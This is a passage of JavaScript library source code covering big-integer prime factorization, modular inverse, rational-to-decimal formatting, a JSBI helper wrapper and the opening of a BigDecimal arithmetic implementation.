    // `n % i` is slower in Chrome and Firefox ...
    return n - Math.floor(n / i) * i;
  }

  function primeFactorUsingWheel(n, max) {
    max = max == undefined ? undefined : max;
    var steps = WHEEL3;
    var cycle = 3;

    if (max == undefined) {
      max = Math.floor(Math.sqrt(maybeJSBI.toNumber(n) + 0.5));
    }

    var i = 2;
    var s = 0;

    while (i <= max) {
      if (remainder(n, i) === 0) {
        return i;
      }

      i += steps[s];
      s += 1;

      if (s === steps.length) {
        s = cycle;
      }
    }

    return n;
  }

  function someFactor(n) {
    var x = maybeJSBI.toNumber(n);

    if (x < 1) {
      throw new TypeError("primeFactor cannot be called for numbers less than 2");
    }

    if (x === 1) {
      return n;
    } //var s = gcd(BigInt(n), BigInt(304250263527210)); // a primorial - https://en.wikipedia.org/wiki/Primorial
    //if (s > 1n) {
    //TODO: use-cases - ?
    //  return s === n ? BigInt(primeFactorUsingWheel(Number(s))) : s;
    //}


    if (x <= Number.MAX_SAFE_INTEGER) {
      var pf = primeFactorUsingWheel(x, 1024);

      if (pf < x) {
        return JSBI.BigInt(pf);
      }

      if (x <= 1024 * 1024) {
        return JSBI.BigInt(pf);
      }

      if (x % 2 === 0) {
        return JSBI.BigInt(2);
      }
    } //! optimize n = f**2


    var squareRoot = JSBI.BigInt(nthRoot(JSBI.BigInt(n), 2));

    if (JSBI.equal(JSBI.exponentiate(squareRoot, JSBI.BigInt(2)), n)) {
      return squareRoot;
    }

    if (x > 5) {
      // https://en.wikipedia.org/wiki/Fermat%27s_factorization_method
      var a = JSBI.add(squareRoot, JSBI.BigInt(1));
      var b2 = JSBI.subtract(JSBI.multiply(a, a), JSBI.BigInt(n));
      var b = JSBI.BigInt(nthRoot(JSBI.BigInt(b2), 2));

      if (JSBI.equal(JSBI.multiply(b, b), b2)) {
        //console.debug("Fermat's method", n, a - b);
        return JSBI.subtract(a, b);
      }
    } //! optimize n = f**3


    var size = bitLength(JSBI.BigInt(n));

    for (var k = 3; k <= size / 10; k += 2) {
      var root = JSBI.BigInt(nthRoot(JSBI.BigInt(n), k));

      if (JSBI.equal(JSBI.exponentiate(root, JSBI.BigInt(k)), JSBI.BigInt(n))) {
        return root;
      }
    }

    if (x <= Number.MAX_SAFE_INTEGER) {
      //return BigInt(primeFactorUsingWheel(x));
      return factorByPollardRhoWrapper(x);
    }

    if (true) {
      var L = function (n) {
        var e = Math.max(0, n.toString(16).length * 4 - 48);
        var lnn = (Math.log2(JSBI.toNumber(JSBI.signedRightShift(JSBI.BigInt(n), JSBI.BigInt(e)))) + e) * Math.LN2;
        return Math.exp(Math.sqrt(lnn * Math.log(lnn)));
      }; //TODO: estimate new limit


      var limit = Math.floor(Math.log(L(n)));

      if (maybeJSBI.toNumber(n) < Math.pow(2, 64)) {
        limit = 1 / 0;
      }

      if (maybeJSBI.toNumber(n) >= Math.pow(2, 128)) {
        // try 2n**128n + 1n (large factors)
        // try 516580063688473107036756944316883068479010630159425669n (small factor)
        limit -= 3;
      } else if (maybeJSBI.toNumber(n) >= Math.pow(2, 96)) {
        limit -= 2;
      } else {
        limit -= 1;
      }

      var factor = factorByPollardRhoWrapper(n, limit);

      if (JSBI.notEqual(factor, JSBI.BigInt(1))) {
        return factor;
      }

      if (true) {
        if (globalThis.onerror != null) {
          var size = bitLength(n);
          var error = new TypeError("big size of " + "someFactor " + "bitLength(" + n + ")" + " === " + size);
          globalThis.onerror(error.message, "", 0, 0, error);
        }
      }

      return QuadraticSieveFactorization(n);
    }

    return factorByPollardRhoWrapper(n);
  } // https://en.wikipedia.org/wiki/Find_first_set#CTZ


  function countTrailingZeros(x, base) {
    //console.log(x, base);
    x = JSBI.BigInt(x);
    base = JSBI.BigInt(base);

    if (JSBI.lessThan(x, JSBI.BigInt(0)) || JSBI.lessThan(base, JSBI.BigInt(0))) {
      throw new RangeError();
    }

    if (maybeJSBI.equal(x, base)) {
      return 1;
    } //if (base == 2 && typeof x === "bigint") { return bitLength(x & -x) - 1; } //TODO: ?


    if (JSBI.equal(x, JSBI.BigInt(0))) {
      throw new TypeError();
    }

    if (JSBI.equal(base, JSBI.BigInt(2))) {
      var k = 32;

      while (JSBI.equal(JSBI.asUintN(k, x), JSBI.BigInt(0))) {
        k *= 2;
      }

      var n = 0;

      for (var i = Math.floor(k / 2); i >= 32; i = Math.floor(i / 2)) {
        if (JSBI.equal(JSBI.asUintN(i, x), JSBI.BigInt(0))) {
          n = maybeJSBI.add(n, i);
          x = JSBI.signedRightShift(x, JSBI.BigInt(i));
        }
      }

      var ctz4 = function (x) {
        var n = +x;
        return 32 - (Math.clz32(n & -n) + 1);
      };

      n = maybeJSBI.add(n, ctz4(JSBI.toNumber(JSBI.asUintN(32, x))));
      return n;
    }

    var k = 1;

    while (JSBI.equal(JSBI.remainder(x, JSBI.exponentiate(base, JSBI.BigInt(k))), JSBI.BigInt(0))) {
      k *= 2;
    }

    var n = 0;

    for (var i = k / 2; i >= 1; i /= 2) {
      var v = JSBI.exponentiate(base, JSBI.BigInt(i));
      var q = JSBI.divide(x, v);
      var r = JSBI.subtract(x, JSBI.multiply(q, v));

      if (JSBI.equal(r, JSBI.BigInt(0))) {
        n = maybeJSBI.add(n, i);
        x = q;
      }
    }

    return n;
  }

  primeFactor._rationalNumberToDecimalString = function (n, d, rounding) {
    // 1 / denominator
    var getPeriodOfRepeatingDecimalSegment = function (denominator, limit) {
      // https://softwareengineering.stackexchange.com/a/192081
      // https://en.wikipedia.org/wiki/Repeating_decimal#Other_properties_of_repetend_lengths
      // "If k = Math.pow(2, a)*5**b*n where n > 1 and n is not divisible by 2 or 5, then the length of the transient of 1/k is max(a, b), and the period equals r, where r is the smallest integer such that 10r â‰¡ 1 (mod n)."
      denominator = JSBI.BigInt(denominator);

      if (JSBI.equal(JSBI.remainder(denominator, JSBI.BigInt(2)), JSBI.BigInt(0)) || JSBI.equal(JSBI.remainder(denominator, JSBI.BigInt(5)), JSBI.BigInt(0))) {
        throw new RangeError("should be called with denominator not divible by 2 or 5");
      }

      var n = denominator;
      var period = 0;

      if (JSBI.notEqual(n, JSBI.BigInt(1))) {
        var z = JSBI.BigInt(1);

        do {
          period += 1;
          z = JSBI.remainder(JSBI.multiply(JSBI.BigInt(10), z), n);
        } while (period <= limit && JSBI.notEqual(z, JSBI.BigInt(1)));
      }

      return period;
    };

    var bigDecimalToPlainString = function (significand, exponent, minFraction, minSignificant) {
      var e = maybeJSBI.add(exponent, significand.length) - 1;
      significand = significand.replace(/0+$/g, '');
      var zeros = Math.max(0, Math.max(e + 1, minSignificant) - significand.length);

      if (e <= -1) {
        significand = maybeJSBI.add("0".repeat(0 - e), significand);
        e = 0;
      }

      significand = maybeJSBI.add(significand, "0".repeat(zeros));
      significand = maybeJSBI.add(significand, "0".repeat(Math.max(minFraction - (significand.length - (e + 1)), 0)));
      return significand.slice(0, e + 1) + (significand.length > e + 1 ? "." + significand.slice(e + 1) : "");
    }; // Something like Number#toPrecision: when value is between 10**-6 and Math.pow(10, p)? - to fixed, otherwise - to exponential:


    var toPrecision = function (significand, exponent, minSignificant) {
      var e = maybeJSBI.add(exponent, significand.length) - 1;

      if (e < -6 || e >= minSignificant) {
        return bigDecimalToPlainString(significand, -(significand.length - 1), 0, minSignificant) + 'e' + (e < 0 ? '-' : '') + Math.abs(e).toString();
      }

      return bigDecimalToPlainString(significand, exponent, 0, minSignificant);
    };

    var digitsToDecimalNumber = function (significand, exponent, rounding) {
      // significand * 10**exponent
      if (rounding.significantDigits != undefined) {
        return toPrecision(significand, exponent, rounding.significantDigits);
      }

      return bigDecimalToPlainString(significand, exponent, rounding.fractionDigits, 0);
    };

    n = JSBI.BigInt(n);
    d = JSBI.BigInt(d);
    var sign = +1;

    if (JSBI.lessThan(d, JSBI.BigInt(0))) {
      d = maybeJSBI.unaryMinus(d);
      sign = -sign;
    }

    if (JSBI.lessThan(n, JSBI.BigInt(0))) {
      n = maybeJSBI.unaryMinus(n);
      sign = -sign;
    }

    var floorOfLog10 = function (n, d) {
      //TODO: optimize - ?
      var guess = Math.floor((bitLength(n) - 1 - bitLength(d)) / Math.log2(10));

      while (maybeJSBI.greaterThanOrEqual(guess < 0 ? JSBI.multiply(JSBI.exponentiate(JSBI.BigInt(10), JSBI.BigInt(-guess)), n) : n, guess > 0 ? JSBI.multiply(JSBI.exponentiate(JSBI.BigInt(10), JSBI.BigInt(guess)), d) : d)) {
        guess += 1;
      }

      return guess - 1;
    };

    var a = primeFactor._countTrailingZeros(d, 2);

    var b = primeFactor._countTrailingZeros(d, 5);

    if (a > 0 && JSBI.equal(JSBI.remainder(n, JSBI.BigInt(2)), JSBI.BigInt(0))) {
      throw new RangeError("not implemented");
    }

    if (b > 0 && JSBI.equal(JSBI.remainder(n, JSBI.BigInt(5)), JSBI.BigInt(0))) {
      throw new RangeError("not implemented");
    }

    var d1 = JSBI.divide(d, JSBI.multiply(JSBI.exponentiate(JSBI.BigInt(2), JSBI.BigInt(a)), JSBI.exponentiate(JSBI.BigInt(5), JSBI.BigInt(b))));
    var lengthOfTransient = Math.max(a, b);

    if ((rounding.fractionDigits != undefined && lengthOfTransient <= rounding.fractionDigits || rounding.significantDigits != undefined && lengthOfTransient + (floorOfLog10(n, d) + 1) - primeFactor._countTrailingZeros(n, 10) <= rounding.significantDigits) && JSBI.equal(JSBI.remainder(n, d1), JSBI.BigInt(0))) {
      // exact result
      var scaling = lengthOfTransient;
      var result = JSBI.divide(JSBI.multiply(JSBI.exponentiate(JSBI.BigInt(10), JSBI.BigInt(scaling)), n), d).toString(); //TODO: optimize - ?

      var minRounding = rounding.fractionDigits != undefined ? {
        fractionDigits: lengthOfTransient
      } : {
        significantDigits: lengthOfTransient + (floorOfLog10(n, d) + 1) <= rounding.significantDigits ? lengthOfTransient + (floorOfLog10(n, d) + 1) : lengthOfTransient + (floorOfLog10(n, d) + 1) - primeFactor._countTrailingZeros(n, 10)
      };
      var f = (sign < 0 ? '-' : '') + digitsToDecimalNumber(result, -scaling, minRounding);
      return f;
    } else {
      var scaling = rounding.fractionDigits != undefined ? rounding.fractionDigits : rounding.significantDigits - (floorOfLog10(n, d) + 1);
      var sn = scaling > 0 ? JSBI.multiply(JSBI.exponentiate(JSBI.BigInt(10), JSBI.BigInt(scaling)), n) : n;
      var sd = scaling < 0 ? JSBI.multiply(JSBI.exponentiate(JSBI.BigInt(10), JSBI.BigInt(maybeJSBI.unaryMinus(scaling))), d) : d;
      var result = JSBI.divide(JSBI.add(sn, JSBI.divide(sd, JSBI.BigInt(2))), sd).toString();
      var f = (sign < 0 ? '-' : '') + digitsToDecimalNumber(result, maybeJSBI.unaryMinus(scaling), rounding);
      var period = getPeriodOfRepeatingDecimalSegment(d1, f.length); ///^0\.(\d+?)(\d*?)(?:\1\2)*\1$/.exec('0.123123')

      if (period !== 0 && maybeJSBI.lessThanOrEqual(period, f.length)) {
        // a repeating decimal, the result is not exact
        var j = f.indexOf('.'); //?

        var offset = j + 1 + lengthOfTransient - (f.indexOf('e') !== -1 ? -maybeJSBI.toNumber(f.slice(f.indexOf('e') + 1)) - 0 : 0) - primeFactor._countTrailingZeros(n, 10);

        if (offset < j + 1) {
          //TODO: fix
          offset = j + 1; //!?
        }

        var lastFractionDigit = f.indexOf('e') !== -1 ? f.indexOf('e') : f.length;

        if (j !== -1 && (offset + period < lastFractionDigit || offset + period === lastFractionDigit && maybeJSBI.lessThan(f.charCodeAt(offset), '5'.charCodeAt(0)))) {
          f = f.slice(0, offset) + '(' + f.slice(offset, offset + period) + ')' + f.slice(offset + period);
        }
      }

      if (!/[^0\.]/.test(f) && sign >= 0 && JSBI.notEqual(n, JSBI.BigInt(0))) {
        f = '+' + f;
      }

      return f;
    }
  };

  function primeFactor(n) {
    n = JSBI.BigInt(n);
    var factor = JSBI.BigInt(someFactor(n));

    if (JSBI.equal(factor, n)) {
      return factor;
    } //var otherFactor = n / factor**BigInt(countTrailingZeros(n, factor));
    //if (otherFactor === 1n) {
    //  return primeFactor(factor);
    //}
    //TODO: divide by gcd (?)
    //if (otherFactor < factor) {
    //  var tmp = factor;
    //  factor = otherFactor;
    //  otherFactor = tmp;
    //}


    var a = primeFactor(factor); //var b = a > nthRoot(nthRoot(otherFactor, 2), 2) || a > 1e9 ? primeFactor(otherFactor) : primeFactorUsingWheelBig(otherFactor, a);
    //return min(a, b);

    return a;
  } // from https://github.com/juanelas/bigint-mod-arith/blob/master/lib/index.browser.mod.js :
  // x * a + y * b = gcd(a, b)


  function eGCD_N(a, b) {
    var zero = maybeJSBI.subtract(a, a);
    var one = maybeJSBI.divide(a, a);
    var $newoldR = abs(a);
    var $newr = abs(b);
    var oldR = $newoldR;
    var r = $newr;
    var $newoldX = one;
    var $newx = zero;
    var oldX = $newoldX;
    var x = $newx;
    var $newoldY = zero;
    var $newy = one;
    var oldY = $newoldY;
    var y = $newy;

    while (maybeJSBI.notEqual(r, zero)) {
      var q = maybeJSBI.divide(maybeJSBI.subtract(oldR, maybeJSBI.remainder(oldR, r)), r);
      var $newoldR = r;
      var $newr = maybeJSBI.subtract(oldR, maybeJSBI.multiply(q, r));
      oldR = $newoldR;
      r = $newr;
      var $newoldX = x;
      var $newx = maybeJSBI.subtract(oldX, maybeJSBI.multiply(q, x));
      oldX = $newoldX;
      x = $newx;
      var $newoldY = y;
      var $newy = maybeJSBI.subtract(oldY, maybeJSBI.multiply(q, y));
      oldY = $newoldY;
      y = $newy;

      if (maybeJSBI.greaterThan(r, maybeJSBI.subtract(oldR, r))) {
        // increase q by 1 and negate coefficients
        r = maybeJSBI.subtract(oldR, r);
        x = maybeJSBI.subtract(oldX, x);
        y = maybeJSBI.subtract(oldY, y);
      }
    }

    return {
      gcd: oldR,
      x: oldX,
      y: oldY
    };
  }

  function modInverseN(a, m) {
    var zero = maybeJSBI.subtract(m, m);
    console.assert(maybeJSBI.greaterThanOrEqual(a, zero));
    console.assert(maybeJSBI.greaterThan(m, zero));

    if (maybeJSBI.greaterThan(a, m)) {
      a = maybeJSBI.remainder(a, m);
    }

    var inv = eGCD_N(a, m).x;
    inv = maybeJSBI.lessThan(inv, zero) ? maybeJSBI.add(inv, m) : inv;
    console.assert(maybeJSBI.greaterThanOrEqual(inv, zero) && maybeJSBI.lessThan(inv, m));
    return inv;
  }

  function modInverse(a, m) {
    if (typeof m === "number") {
      if (typeof a === "number") {
        return modInverseN(a, m);
      }

      return modInverseN(JSBI.toNumber(JSBI.remainder(JSBI.BigInt(a), JSBI.BigInt(m))), m);
    }

    return modInverseN(JSBI.BigInt(a), JSBI.BigInt(m));
  }

  primeFactor._bitLength = bitLength;

  primeFactor._isPrime = function (n) {
    var number = maybeJSBI.toNumber(n);

    if (number <= Number.MAX_SAFE_INTEGER) {
      return isPrimeSmall(number);
    }

    return isPrime(n);
  };

  primeFactor._countTrailingZeros = countTrailingZeros;
  primeFactor._someFactor = someFactor;
  primeFactor._modInverse = modInverse;

  primeFactor._integerNthRoot = function (a, n) {
    return nthRoot(JSBI.BigInt(a), n);
  };

  primeFactor.testables = {
    factorByPollardRho: factorByPollardRho,
    factorByPollardRhoWrapper: factorByPollardRhoWrapper
  };
  self.primeFactor = primeFactor;
})();
var maybeJSBI = {
  toNumber: function toNumber(a) {
    return typeof a === "object" ? JSBI.toNumber(a) : Number(a);
  },
  add: function add(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.add(a, b) : a + b;
  },
  subtract: function subtract(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.subtract(a, b) : a - b;
  },
  multiply: function multiply(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.multiply(a, b) : a * b;
  },
  divide: function divide(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.divide(a, b) : a / b;
  },
  remainder: function remainder(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.remainder(a, b) : a % b;
  },
  exponentiate: function exponentiate(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.exponentiate(a, b) : typeof a === "bigint" && typeof b === "bigint" ? new Function("a", "b", "return a**b")(a, b) : Math.pow(a, b);
  },
  leftShift: function leftShift(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.leftShift(a, b) : a << b;
  },
  signedRightShift: function signedRightShift(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.signedRightShift(a, b) : a >> b;
  },
  bitwiseAnd: function bitwiseAnd(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.bitwiseAnd(a, b) : a & b;
  },
  bitwiseOr: function bitwiseOr(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.bitwiseOr(a, b) : a | b;
  },
  bitwiseXor: function bitwiseXor(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.bitwiseXor(a, b) : a ^ b;
  },
  lessThan: function lessThan(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.lessThan(a, b) : a < b;
  },
  greaterThan: function greaterThan(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.greaterThan(a, b) : a > b;
  },
  lessThanOrEqual: function lessThanOrEqual(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.lessThanOrEqual(a, b) : a <= b;
  },
  greaterThanOrEqual: function greaterThanOrEqual(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.greaterThanOrEqual(a, b) : a >= b;
  },
  equal: function equal(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.equal(a, b) : a === b;
  },
  notEqual: function notEqual(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.notEqual(a, b) : a !== b;
  },
  unaryMinus: function unaryMinus(a) {
    return typeof a === "object" ? JSBI.unaryMinus(a) : -a;
  },
  bitwiseNot: function bitwiseNot(a) {
    return typeof a === "object" ? JSBI.bitwiseNot(a) : ~a;
  }
};


(function () {
  "use strict";
  /*jslint bigint: true, vars: true, indent: 2*/
  // https://github.com/tc39/proposal-decimal
  // https://en.wikipedia.org/wiki/Floating-point_arithmetic
  // https://en.wikipedia.org/wiki/Fixed-point_arithmetic
  // Usage:
  // BigDecimal.BigDecimal(bigint)
  // BigDecimal.BigDecimal(string)
  // BigDecimal.BigDecimal(number) (only integers)
  // BigDecimal.toBigInt(a) (not in the spec)
  // BigDecimal.toNumber(a) (not in the spec, only integers)
  // BigDecimal.unaryMinus(a)
  // BigDecimal.add(a, b[, rounding])
  // BigDecimal.subtract(a, b[, rounding])
  // BigDecimal.multiply(a, b[, rounding])
  // BigDecimal.divide(a, b, rounding)
  // BigDecimal.lessThan(a, b)
  // BigDecimal.greaterThan(a, b)
  // BigDecimal.equal(a, b)
  // BigDecimal.round(a, rounding)
  // a.toString()
  // a.toFixed(fractionDigits[, roundingMode = "half-up"])
  // a.toPrecision(precision[, roundingMode = "half-up"])
  // a.toExponential(fractionDigits[, roundingMode = "half-up"])
  // Math: (not in the spec)
  // BigDecimal.log(a, rounding)
  // BigDecimal.exp(a, rounding)
  // BigDecimal.sin(a, rounding)
  // BigDecimal.cos(a, rounding)
  // BigDecimal.atan(a, rounding)
  // BigDecimal.sqrt(a, rounding)
  // "simple" Math functions:
  // BigDecimal.abs(a)
  // BigDecimal.sign(a)
  // BigDecimal.max(a, b)
  // BigDecimal.min(a, b)
  // (!) Note: consider to use only "half-even" rounding mode and rounding to a maximum number of significant digits for floating-point arithmetic,
  // or only "floor" rounding to a maximum number of fraction digits for fixed-point arithmetic.
  // BigFloat may have better performance.

  var factory = function (BASE) {
    var BIGINT_BASE = JSBI.BigInt(BASE);

    function BigDecimal(significand, exponent) {
      this.significand = significand;
      this.exponent = exponent;
    }

    BigDecimal.BigFloat = BigDecimal.BigDecimal = function (value) {
      if (value instanceof BigDecimal) {
        return value;
      }

      if (typeof value === "string") {
        if (BASE !== 10) {
          throw new Error();
        }

        var match = /^\s*([+\-])?(\d+)?\.?(\d+)?(?:e([+\-]?\d+))?\s*$/.exec(value);

        if (match == null) {
          throw new RangeError(value);
        }

        var exponent = Number(match[4] || "0");
        return create(JSBI.BigInt((match[1] || "") + (match[2] || "") + (match[3] || "")), diff(Math.abs(exponent) < Number.MAX_SAFE_INTEGER ? exponent : JSBI.BigInt(match[4] || "0"), (match[3] || "").length));
      }

      if (typeof value === "number" && Math.floor(value) !== value) {
        if (BASE === 2) {
          var e = getExponent(value);
          var f = value / Math.pow(2, e);
          var significand = f * (Number.MAX_SAFE_INTEGER + 1) / 2;
          var exponent = e - (Math.floor(Math.log2(Number.MAX_SAFE_INTEGER + 1)) - 1);
          return create(JSBI.BigInt(significand), exponent); //TODO: ?
        }
      }

      var a = create(JSBI.BigInt(value), 0); // `normalize` will change the exponent which is not good for fixed-point arithmetic (?)
      //var b = normalize(a, null);
      //while (a !== b) {
      //  a = b;
      //  b = normalize(a, null);
      //}

      return a;
    };

    BigDecimal.toNumber = function (a) {
      return maybeJSBI.toNumber(BigDecimal.toBigInt(a));
    };

    BigDecimal.toBigInt = function (a) {
      var exponent = maybeJSBI.toNumber(a.exponent);

      if (exponent === 0) {
        return a.significand;
      }

      if (exponent < 0) {
        var result = bigIntUnscale(a.significand, maybeJSBI.unaryMinus(exponent));

        if (maybeJSBI.notEqual(bigIntScale(result, maybeJSBI.unaryMinus(exponent)), a.significand)) {
          throw new RangeError("The BigDecimal " + a.toString() + " cannot be converted to a BigInt because it is not an integer");
        }

        return result;
      }

      return bigIntScale(a.significand, exponent);
    };

    function create(significand, exponent) {
      return (
        /*Object.freeze(*/
        new BigDecimal(significand, exponent)
        /*)*/

      );
    }

    function bigIntMax(a, b) {
      return maybeJSBI.lessThan(a, b) ? b : a;
    }

    function bigIntMin(a, b) {
      return maybeJSBI.lessThan(a, b) ? a : b;
    }

    function bigIntAbs(a) {
      return JSBI.lessThan(a, JSBI.BigInt(0)) ? maybeJSBI.unaryMinus(a) : a;
    } // https://github.com/tc39/proposal-bigint/issues/205
    // https://github.com/tc39/ecma262/issues/1729
    // floor(log2(a)) + 1 if a > 0


    function bitLength(a) {
      var s = a.toString(16);
      var c = maybeJSBI.subtract(s.charCodeAt(0), "0".charCodeAt(0));

      if (c <= 0) {
        throw new RangeError();
      }

      return (s.length - 1) * 4 + (32 - Math.clz32(Math.min(c, 8)));
    }

    function bigIntLog2(n) {
      var k = bitLength(n) - Math.floor(Math.log2(Number.MAX_SAFE_INTEGER + 1));
      var leadingDigits = JSBI.toNumber(JSBI.signedRightShift(n, JSBI.BigInt(k)));
      return Math.log2(leadingDigits) + k;
    }

    function digits(a) {
      // floor(log(abs(a)) / log(BASE)) + 1
      a = bigIntAbs(a);

      if (BASE === 2) {
        return bitLength(a);
      }

      var number = maybeJSBI.toNumber(a);

      if (number < (Number.MAX_SAFE_INTEGER + 1) / 16) {
        return Math.floor(Math.log2(number + 0.5) / Math.log2(BASE)) + 1;
      }

      var e = (number < 1 / 0 ? Math.log2(number) : bigIntLog2(a)) / Math.log2(BASE);

      if (Math.floor(e * (1 - 32 / (Number.MAX_SAFE_INTEGER + 1))) === Math.floor(e) && Math.floor(e * (1 + 32 / (Number.MAX_SAFE_INTEGER + 1))) === Math.floor(e)) {
        return Math.floor(e) + 1;
      }

      var i = Math.floor(e + 0.5);
      return maybeJSBI.greaterThanOrEqual(a, cachedPower(i)) ? i + 1 : i;
    }

    function sum(a, b) {
      if (typeof a === "number" && typeof b === "number") {
        var value = a + b;

        if (value >= maybeJSBI.unaryMinus(Number.MAX_SAFE_INTEGER) && value <= +Number.MAX_SAFE_INTEGER) {
          return value;
        }
      }

      var v = JSBI.add(JSBI.BigInt(a), JSBI.BigInt(b));
      var nv = JSBI.toNumber(v);

      if (nv >= maybeJSBI.unaryMinus(Number.MAX_SAFE_INTEGER) && nv <= +Number.MAX_SAFE_INTEGER) {
        return nv;
      }

      return v;
    }

    function diff(a, b) {
      return sum(a, maybeJSBI.unaryMinus(b));
    }

    var E = Math.ceil(0.5 * Math.log2(Number.MAX_SAFE_INTEGER + 1) / Math.log2(BASE) - 1);
    var N = JSBI.BigInt(Math.pow(BASE, E));

    function normalize(a, rounding) {
      if (rounding == null || rounding.maximumSignificantDigits != null) {
        if (JSBI.equal(a.significand, JSBI.BigInt(0))) {
          return a.exponent === 0 ? a : create(JSBI.BigInt(0), 0);
        }

        var dividend = a.significand;
        var e = E;
        var divisor = N;

        if (JSBI.equal(JSBI.remainder(dividend, divisor), JSBI.BigInt(0))) {
          while (JSBI.equal(JSBI.remainder(dividend, JSBI.multiply(divisor, divisor)), JSBI.BigInt(0))) {
            divisor = JSBI.multiply(divisor, divisor);
            e *= 2;
          }

          var quotient = JSBI.divide(dividend, divisor);
          return create(quotient, sum(a.exponent, e));
        }
      }

      return a;
    }

    function cachedFunction(f) {
      var cache = {};
      var cacheSize = 0;
      return function (k) {
        var lastValue = cache[k];

        if (lastValue == null) {
          if (cacheSize > 100) {
            cache = {};
            cacheSize = 0;
          }

          lastValue = f(k);
          cache[k] = lastValue;
          cacheSize += 1;
        }

        return lastValue;
      };
    }

    var cachedBigInt = cachedFunction(function (k) {
      // k === maximumFractionDigits
      return JSBI.BigInt(k);
    });
    var cachedPower = cachedFunction(function (k) {
      return JSBI.exponentiate(BIGINT_BASE, JSBI.BigInt(k));
    });

    function round(a, rounding) {
      if (rounding != null) {
        var k = 0;
        var dividend = a.significand;
        var exponent = a.exponent;
        var maximumSignificantDigits = rounding.maximumSignificantDigits;

        if (maximumSignificantDigits != null) {
          if (!(maximumSignificantDigits > 0)) {
            throw new RangeError("maximumSignificantDigits should be positive");
          }

          if (JSBI.equal(dividend, JSBI.BigInt(0))) {
            return create(JSBI.BigInt(0), 0);
          }

          k = digits(dividend) - maximumSignificantDigits;
        }

        var maximumFractionDigits = rounding.maximumFractionDigits;

        if (maximumFractionDigits != null) {
          if (!(maximumFractionDigits >= 0)) {
            throw new RangeError("maximumFractionDigits should be non-negative");
          }

          k = 0 - maybeJSBI.toNumber(sum(exponent, maximumFractionDigits)); //k = Math.min(k, digits(a.significand) + 1);
          //if (k < 0 && k >= -1024 && BASE === 2) {
          //  return create(a.significand << BigInt(-k), 0 - maximumFractionDigits);
          //}
        }

        if (k > 0) {
          var roundingMode = rounding.roundingMode;
          var quotient = JSBI.BigInt(0);

          if (roundingMode === "floor") {
            if (BASE === 2) {
              quotient = maybeJSBI.signedRightShift(dividend, cachedBigInt(k));
            } else {
              if (JSBI.greaterThanOrEqual(dividend, JSBI.BigInt(0))) {
                quotient = maybeJSBI.divide(dividend, cachedPower(k));
              } else {
                quotient = JSBI.subtract(JSBI.divide(JSBI.add(dividend, JSBI.BigInt(1)), cachedPower(k)), JSBI.BigInt(1));
              }
            }
          } else if (roundingMode === "ceil") {
            if (BASE === 2) {
              quotient = maybeJSBI.unaryMinus(maybeJSBI.signedRightShift(maybeJSBI.unaryMinus(dividend), cachedBigInt(k)));
            } else {
              if (JSBI.lessThan(dividend, JSBI.BigInt(0))) {
                quotient = maybeJSBI.divide(dividend, cachedPower(k));
              } else {
                quotient = JSBI.add(JSBI.divide(JSBI.subtract(dividend, JSBI.BigInt(1)), cachedPower(k)), JSBI.BigInt(1));
              }
            }
          } else {
            var divisor = BASE === 2 ? JSBI.leftShift(JSBI.BigInt(1), cachedBigInt(k)) : cachedPower(k);
            quotient = maybeJSBI.divide(dividend, divisor);
            var twoRemainders = JSBI.multiply(maybeJSBI.subtract(dividend, maybeJSBI.multiply(divisor, quotient)), JSBI.BigInt(2));

            if (JSBI.notEqual(twoRemainders, JSBI.BigInt(0))) {
              if (roundingMode === "half-up") {
                twoRemainders = JSBI.add(twoRemainders, JSBI.lessThan(twoRemainders, JSBI.BigInt(0)) ? JSBI.unaryMinus(JSBI.BigInt(1)) : JSBI.BigInt(1));
              } else if (roundingMode === "half-down") {
                twoRemainders = JSBI.add(twoRemainders, JSBI.BigInt(0));
              } else if (roundingMode === "half-even") {
                twoRemainders = JSBI.add(twoRemainders, JSBI.remainder(quotient, JSBI.BigInt(2)));
              } else {
                throw new RangeError("supported roundingMode (floor/ceil/half-even/half-up/half-down) is not given");
              }

              if (JSBI.greaterThan(twoRemainders, divisor)) {
                quotient = JSBI.add(quotient, JSBI.BigInt(1));
              }

              if (JSBI.greaterThan(JSBI.unaryMinus(twoRemainders), divisor)) {
                quotient = JSBI.subtract(quotient, JSBI.BigInt(1));
              }
            }
          }

          return create(quotient, sum(exponent, k));
        }
      }

      return a;
    }

    BigDecimal.unaryMinus = function (a) {
      return create(maybeJSBI.unaryMinus(a.significand), a.exponent);
    };

    BigDecimal.add = function (a, b, rounding) {
      rounding = rounding == undefined ? null : rounding;
      var bd = diff(a.exponent, b.exponent);
      var d = maybeJSBI.toNumber(bd);

      if (d !== 0) {
        // optimization
        if (JSBI.equal(a.significand, JSBI.BigInt(0))) {
          return round(b, rounding);
        }

        if (JSBI.equal(b.significand, JSBI.BigInt(0))) {
          return round(a, rounding);
        }

        if (d > 0) {
          if (rounding != null && rounding.maximumSignificantDigits != null && d > digits(b.significand) + (rounding.maximumSignificantDigits + 1)) {
            return round(create(JSBI.add(bigIntScale(a.significand, rounding.maximumSignificantDigits + 1), JSBI.lessThan(b.significand, JSBI.BigInt(0)) ? JSBI.unaryMinus(JSBI.BigInt(1)) : JSBI.BigInt(1)), diff(a.exponent, rounding.maximumSignificantDigits + 1)), rounding);
          }

          return round(create(maybeJSBI.add(bigIntScale(a.significand, bd), b.significand), b.exponent), rounding);
        }

        if (d < 0) {
          if (rounding != null && rounding.maximumSignificantDigits != null && 0 - d > digits(a.significand) + (rounding.maximumSignificantDigits + 1)) {
